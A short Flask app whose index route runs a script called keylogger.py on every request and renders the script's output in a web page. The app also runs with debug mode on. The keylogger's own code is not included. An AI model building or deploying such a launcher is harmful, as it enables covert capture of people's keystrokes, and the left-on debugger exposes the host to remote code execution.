from flask import Flask, render_template
from subprocess import Popen, PIPE

app = Flask(__name__)

@app.route("/")
def index():
    p = Popen(['python', 'keylogger.py'], stdout=PIPE, stderr=PIPE)
    output, errors = p.communicate()
    return render_template('frontpage.html', output=output.decode())

if __name__ == "__main__":
    app.run(debug=True)